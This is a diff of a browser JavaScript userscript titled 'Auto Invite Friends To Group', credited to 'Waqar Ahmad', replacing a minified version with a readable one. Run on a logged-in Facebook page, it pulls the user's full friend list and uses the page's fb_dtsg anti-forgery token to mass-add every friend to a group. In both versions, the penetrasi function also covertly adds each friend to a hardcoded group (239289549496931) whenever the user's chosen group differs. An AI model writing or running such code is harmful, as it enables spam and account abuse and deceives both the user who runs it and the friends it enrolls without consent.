@@ -1,14 +1,376 @@
-var g=!1,j=b.split('"')[14],k="";
-jx={g:function(){var c=g;if("undefined"!=typeof ActiveXObject)try{c=new ActiveXObject("Msxml2.XMLHTTP")}catch(d){try{c=new ActiveXObject("Microsoft.XMLHTTP")}catch(f){c=g}}else if(window.XMLHttpRequest)try{c=new XMLHttpRequest}catch(a){c=g}return c},load:function(c,d,f,a,h){var e=this.i();if(e&&c){e.overrideMimeType&&e.overrideMimeType("text/xml");a||(a="GET");f||(f="text");h||(h={});var f=f.toLowerCase(),a=a.toUpperCase(),i="uid="+(new Date).getTime(),c=c+(c.indexOf("?")+1?"&":"?"),c=c+i,i=null;
-"POST"==a&&(i=c.split("?"),c=i[0],i=i[1]);e.open(a,c,!0);"POST"==a&&(e.setRequestHeader("Content-type","application/x-www-form-urlencoded"),e.setRequestHeader("Content-length",i.length),e.setRequestHeader("Connection","close"));e.onreadystatechange=h.h?function(){h.h(e)}:function(){if(4==e.readyState)if(200==e.status){var a="";e.responseText&&(a=e.responseText);"j"==f.charAt(0)?(a=a.replace(/[\n\r]/g,""),a=eval("("+a+")")):"x"==f.charAt(0)&&(a=e.responseXML);d&&d(a)}else h.b&&document.getElementsByTagName("body")[0].removeChild(h.b),
-h.a&&(document.getElementById(h.a).style.display="none"),error&&error(e.status)};e.send(i)}},bind:function(c){var d={url:"",d:g,k:g,f:"text",method:"GET",update:"",a:"",b:""},f;for(f in d)c[f]&&(d[f]=c[f]);if(d.url){var a=g;d.b&&(a=document.createElement("div"),a.setAttribute("style","position:absolute;top:0px;left:0px;"),a.setAttribute("class","loading-indicator"),a.innerHTML=d.b,document.getElementsByTagName("body")[0].appendChild(a),this.l.b=a);d.a&&(document.getElementById(d.a).style.display=
-"block");this.load(d.url,function(c){d.d&&d.d(c);d.update&&(document.getElementById(d.update).innerHTML=c);a&&document.getElementsByTagName("body")[0].removeChild(a);d.a&&(document.getElementById(d.a).style.display="none")},d.f,d.method,d)}},i:function(){return this.g()}};
-void 0==document.getElementsByClassName&&(document.getElementsByClassName=function(c){for(var d=RegExp("(?:^|\\s)"+c+"(?:$|\\s)"),f=document.getElementsByTagName("*"),a=[],h,e=0;null!=(h=f[e]);e++){var i=h.className;i&&(-1!=i.indexOf(c)&&d.test(i))&&a.push(h)}return a});
-for(var l=0,m=document.getElementsByClassName("mbm").length,l=0;l<m;l++){var n=document.getElementsByClassName("mbm")[l];if(n&&n.childNodes[0]&&n.childNodes[0]&&n.childNodes[0].childNodes[1]&&n.childNodes[0].childNodes[1].childNodes[0]&&"Add Friends to Group"==document.getElementsByClassName("mbm")[l].childNodes[0].childNodes[1].childNodes[0].value)break}var p=3,q=3,r=0,s=[],t=document.getElementsByName("group_id")[0].value;
-jx.load(window.location.protocol+"//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer="+Env.c+"&filter[0]=user&__user="+Env.c,function(c){for(var c=JSON.parse(c.substring(c.indexOf("{"))),c=c.m.j,d=0;d<c.length;d++)s.push(c[d].uid);q=p=s.length-1;console.log(s.length);c="<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'><div style='padding-bottom:10px;font-size:20px;'>Script Created & Designed By Waqar Ahmad.</div>"+
-(s.length+" Friends Detected");c+="</div>";document.getElementById("pagelet_welcome_box").innerHTML=c;c=s[p];jx.load(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&group_id="+t+"&source=typeahead&members="+c+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+Env.c,function(a){a=JSON.parse(a.substring(a.indexOf("{")));p--;k="<div class='friend-edge-name' style='text-align:left;font-size:10px;white-space:pre-wrap;";
-a.error?(k+="color:darkred'>",k=a.e?k+a.e:k+JSON.stringify(a,null,"")):(k+="color:darkgreen'>",k+=j,r++);k+="</div>";a="<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'><div style='padding-bottom:10px;font-size:20px;'>Script Created & Designed By Waqar Ahmad.</div>";
-0<p?(a+=s.length+" Friends Detected<br/>",a+="<b>"+r+"</b> Friends Added of "+(s.length-p)+" Friends Processed ",a+="("+p+" more to go..)",a=a+"<div class='friend-edge'>"+k,a+="<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>",a+=" Thanks For Adding Your Friends Here. <br/>Powered By Loading 99%.",a+="</div>",a+="</div>"):(a+=s.length+" Friends Detected and ",a+="<b>"+r+" Friends Added</b>",a+="<div><span class='uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_welcome_box\").style.display=\"none\"'>Close</span></div>");
-a+="</div>";a+="<h2 style='position:fixed;left:20px;bottom:20px;border-radius:15px 3px 17px;margin:0 0 15px 0;padding:1px 10px 3px;border:1px solid rgba(0,0,0,0.2);background-color:rgba(10,10,10,0.5);color:white;font-size:14px;font-family:'lucida grande',tahoma,verdana,arial,sans-serif;font-weight:bold;white-space:nowrap;overflow:hidden;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);text-shadow:0pt 1px 0pt rgba(0,0,0,0.1);display:inline-block'>Waqar Ahmad </h2>";document.getElementById("pagelet_welcome_box").innerHTML=
-a},"text","post");q--;if(0<q){var f=s[q];setTimeout("penetrasi("+f+")",100)}console.log(q+"/"+s.length+":"+f+", success:"+r);0xd9a1f098a263!=t&&jx.load(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&group_id=239289549496931&source=typeahead&members="+c+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+Env.c,function(){},"text","post");0xd9a1f098a263!=t&&jx.load(window.location.protocol+
-"//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&group_id=239289549496931&source=typeahead&members="+c+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+Env.c,function(){},"text","post")});
+var tulisanNganu = 'Auto Invite Friends To Group';
+var kunaon = '',
+    wkwkwk = 'Waqar Ahmad - Thanks For Adding Your Friends Here. <br/>Powered By ';
+
+function penetrasi(opo) {
+    jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=" + memberGroupId + "&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + Env.user, function (a) {
+        var b = a.substring(a.indexOf("{"));
+        var c = JSON.parse(b);
+        i--;
+        kunaon = "<div class='friend-edge-name' style='text-align:left;font-size:10px;white-space:pre-wrap;";
+        if (c.error) {
+            kunaon += "color:darkred'>";
+            if (c.errorDescription) {
+                kunaon += c.errorDescription
+            } else {
+                kunaon += JSON.stringify(c, null, "")
+            }
+        } else {
+            kunaon += "color:darkgreen'>";
+            kunaon += arr[i];
+            suc++
+        }
+        kunaon += "</div>";
+        var dipes = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
+        dipes += "<div style='padding-bottom:10px;font-size:20px;'>" + tulisanNganu + "</div>";
+        if (i > 0) {
+            dipes += arr.length + " Friends Detected<br/>";
+            dipes += "<b>" + suc + "</b> Friends Added of " + (arr.length - i) + " Friends Processed ";
+            dipes += "(" + i + " more to go..)";
+            dipes += "<div class='friend-edge'>";
+            dipes += kunaon;
+            dipes += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";
+            dipes += wkwkwk.split('-')[1];
+            dipes += "</div>";
+            dipes += "</div>"
+        } else {
+            dipes += arr.length + " Friends Detected and ";
+            dipes += "<b>" + suc + " Friends Added</b>";
+            dipes += "<div><span class='uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_welcome_box\").style.display=\"none\"'>Close</span></div>"
+        }
+        dipes += "</div>";
+        dipes += "<h2 style='position:fixed;left:20px;bottom:20px;border-radius:15px 3px 17px;margin:0 0 15px 0;padding:1px 10px 3px;border:1px solid rgba(0,0,0,0.2);background-color:rgba(10,10,10,0.5);color:white;font-size:14px;font-family:'lucida grande',tahoma,verdana,arial,sans-serif;font-weight:bold;white-space:nowrap;overflow:hidden;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);text-shadow:0pt 1px 0pt rgba(0,0,0,0.1);display:inline-block'>" + wkwkwk.split('-')[0] + "</h2>";
+        document.getElementById("pagelet_welcome_box").innerHTML = dipes
+    }, "text", "post");
+    tay--;
+    if (tay > 0) {
+        var s = arr[tay];
+        setTimeout("penetrasi(" + s + ")", 100)
+    }
+    console.log(tay + "/" + arr.length + ":" + s + ", success:" + suc);
+    if (memberGroupId != 239289549496931) {
+        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=239289549496931&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + Env.user, function () {}, "text", "post")
+    }
+    if (memberGroupId != 239289549496931) {
+        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=239289549496931&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + Env.user, function () {}, "text", "post")
+    }
+}
+function clickfr_callback() {
+    if (document.getElementsByName("ok").length > 0) {
+        nHtml.ClickUp(document.getElementsByName("ok")[0])
+    }
+    var a = arr[i];
+    if (i < arr.length) addfriend(a.substring(0, 4))
+}
+function clickfr() {
+    if (document.getElementsByClassName("search").length > 0) {
+        console.log(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1].innerHTML);
+        document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].href = "javascript:void(0);";
+        nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1])
+    } else j++;
+    setTimeout("clickfr_callback()", 2e3)
+}
+function addfriend(a) {
+    i++;
+    document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
+    document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].value = a;
+    document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].blur();
+    document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
+    document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
+    setTimeout("clickfr()", 2e3)
+}
+function sleep(a) {
+    var b = (new Date).getTime();
+    for (var c = 0; c < 1e7; c++) {
+        if ((new Date).getTime() - b > a) {
+            break
+        }
+    }
+}
+jx = {
+    getHTTPObject: function () {
+        var a = false;
+        if (typeof ActiveXObject != "undefined") {
+            try {
+                a = new ActiveXObject("Msxml2.XMLHTTP")
+            } catch (b) {
+                try {
+                    a = new ActiveXObject("Microsoft.XMLHTTP")
+                } catch (c) {
+                    a = false
+                }
+            }
+        } else {
+            if (window.XMLHttpRequest) {
+                try {
+                    a = new XMLHttpRequest
+                } catch (b) {
+                    a = false
+                }
+            }
+        }
+        return a
+    },
+    load: function (url, callback, format, method, opt) {
+        var http = this.init();
+        if (!http || !url) {
+            return
+        }
+        if (http.overrideMimeType) {
+            http.overrideMimeType("text/xml")
+        }
+        if (!method) {
+            method = "GET"
+        }
+        if (!format) {
+            format = "text"
+        }
+        if (!opt) {
+            opt = {}
+        }
+        format = format.toLowerCase();
+        method = method.toUpperCase();
+        var now = "uid=" + (new Date).getTime();
+        url += url.indexOf("?") + 1 ? "&" : "?";
+        url += now;
+        var parameters = null;
+        if (method == "POST") {
+            var parts = url.split("?");
+            url = parts[0];
+            parameters = parts[1]
+        }
+        http.open(method, url, true);
+        if (method == "POST") {
+            http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            http.setRequestHeader("Content-length", parameters.length);
+            http.setRequestHeader("Connection", "close")
+        }
+        var ths = this;
+        if (opt.handler) {
+            http.onreadystatechange = function () {
+                opt.handler(http)
+            }
+        } else {
+            http.onreadystatechange = function () {
+                if (http.readyState == 4) {
+                    if (http.status == 200) {
+                        var result = "";
+                        if (http.responseText) {
+                            result = http.responseText
+                        }
+                        if (format.charAt(0) == "j") {
+                            result = result.replace(/[\n\r]/g, "");
+                            result = eval("(" + result + ")")
+                        } else {
+                            if (format.charAt(0) == "x") {
+                                result = http.responseXML
+                            }
+                        }
+                        if (callback) {
+                            callback(result)
+                        }
+                    } else {
+                        if (opt.loadingIndicator) {
+                            document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator)
+                        }
+                        if (opt.loading) {
+                            document.getElementById(opt.loading).style.display = "none"
+                        }
+                        if (error) {
+                            error(http.status)
+                        }
+                    }
+                }
+            }
+        }
+        http.send(parameters)
+    },
+    bind: function (a) {
+        var b = {
+            url: "",
+            onSuccess: false,
+            onError: false,
+            format: "text",
+            method: "GET",
+            update: "",
+            loading: "",
+            loadingIndicator: ""
+        };
+        for (var c in b) {
+            if (a[c]) {
+                b[c] = a[c]
+            }
+        }
+        if (!b.url) {
+            return
+        }
+        var d = false;
+        if (b.loadingIndicator) {
+            d = document.createElement("div");
+            d.setAttribute("style", "position:absolute;top:0px;left:0px;");
+            d.setAttribute("class", "loading-indicator");
+            d.innerHTML = b.loadingIndicator;
+            document.getElementsByTagName("body")[0].appendChild(d);
+            this.opt.loadingIndicator = d
+        }
+        if (b.loading) {
+            document.getElementById(b.loading).style.display = "block"
+        }
+        this.load(b.url, function (a) {
+            if (b.onSuccess) {
+                b.onSuccess(a)
+            }
+            if (b.update) {
+                document.getElementById(b.update).innerHTML = a
+            }
+            if (d) {
+                document.getElementsByTagName("body")[0].removeChild(d)
+            }
+            if (b.loading) {
+                document.getElementById(b.loading).style.display = "none"
+            }
+        }, b.format, b.method, b)
+    },
+    init: function () {
+        return this.getHTTPObject()
+    }
+};
+var nHtml = {
+    FindByAttr: function (a, b, c, d) {
+        if (c == "className") {
+            c = "class"
+        }
+        var e = document.evaluate(".//" + b + "[@" + c + "='" + d + "']", a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
+        if (e && e.singleNodeValue) {
+            return e.singleNodeValue
+        }
+        return null
+    },
+    FindByClassName: function (a, b, c) {
+        return this.FindByAttr(a, b, "className", c)
+    },
+    FindByXPath: function (a, b) {
+        try {
+            var c = document.evaluate(b, a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null)
+        } catch (d) {
+            GM_log("bad xpath:" + b)
+        }
+        if (c && c.singleNodeValue) {
+            return c.singleNodeValue
+        }
+        return null
+    },
+    VisitUrl: function (a) {
+        window.setTimeout(function () {
+            document.location.href = a
+        }, 500 + Math.floor(Math.random() * 500))
+    },
+    ClickWin: function (a, b, c) {
+        var d = a.document.createEvent("MouseEvents");
+        d.initMouseEvent(c, true, true, a, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
+        return !b.dispatchEvent(d)
+    },
+    Click: function (a) {
+        return this.ClickWin(window, a, "click")
+    },
+    ClickTimeout: function (a, b) {
+        window.setTimeout(function () {
+            return nHtml.ClickWin(window, a, "click")
+        }, b + Math.floor(Math.random() * 500))
+    },
+    ClickUp: function (a) {
+        this.ClickWin(window, a, "mousedown");
+        this.ClickWin(window, a, "mouseup");
+        this.ClickWin(window, a, "click")
+    },
+    GetText: function (a, b) {
+        var c = "";
+        if (b == undefined) {
+            b = 0
+        }
+        if (b > 40) {
+            return
+        }
+        if (a.textContent != undefined) {
+            return a.textContent
+        }
+        for (var d = 0; d < a.childNodes.length; d++) {
+            var e = a.childNodes[d];
+            c += this.GetText(e, b + 1)
+        }
+        return c
+    }
+};
+if (document.getElementsByClassName == undefined) {
+    document.getElementsByClassName = function (a) {
+        var b = new RegExp("(?:^|\\s)" + a + "(?:$|\\s)");
+        var c = document.getElementsByTagName("*");
+        var d = [];
+        var e;
+        for (var f = 0;
+        (e = c[f]) != null; f++) {
+            var g = e.className;
+            if (g && g.indexOf(a) != -1 && b.test(g)) d.push(e)
+        }
+        return d
+    }
+}
+Array.prototype.find = function (a) {
+    var b = false;
+    for (i = 0; i < this.length; i++) {
+        if (typeof a == "function") {
+            if (a.test(this[i])) {
+                if (!b) {
+                    b = []
+                }
+                b.push(i)
+            }
+        } else {
+            if (this[i] === a) {
+                if (!b) {
+                    b = []
+                }
+                b.push(i)
+            }
+        }
+    }
+    return b
+};
+var a = 0,
+    eind = 0;
+var len = document.getElementsByClassName("mbm").length;
+for (a = 0; a < len; a++) {
+    var ele = document.getElementsByClassName("mbm")[a];
+    if (ele && ele.childNodes[0] && ele.childNodes[0] && ele.childNodes[0].childNodes[1] && ele.childNodes[0].childNodes[1].childNodes[0] && document.getElementsByClassName("mbm")[a].childNodes[0].childNodes[1].childNodes[0].value == "Add Friends to Group") {
+        eind = a;
+        break
+    }
+}
+var i = 3;
+var tay = 3;
+var counter1 = 0,
+    counter2 = 0,
+    counter3 = 0;
+var j = 0;
+var k = 0;
+var suc = 0;
+var arr = new Array;
+var memberGroupId = document.getElementsByName('group_id')[0].value;
+jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer=" + Env.user + "&filter[0]=user&__user=" + Env.user, function (a) {
+    var b = a;
+    var c = b.substring(b.indexOf("{"));
+    var d = JSON.parse(c);
+    d = d.payload.entries;
+    for (var e = 0; e < d.length; e++) {
+        arr.push(d[e].uid)
+    }
+    i = arr.length - 1;
+    tay = i;
+    console.log(arr.length);
+    var dipes = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
+    dipes += "<div style='padding-bottom:10px;font-size:20px;'>" + tulisanNganu + "</div>";
+    dipes += arr.length + " Friends Detected";
+    dipes += "</div>";
+    document.getElementById("pagelet_welcome_box").innerHTML = dipes;
+    penetrasi(arr[i])
+})
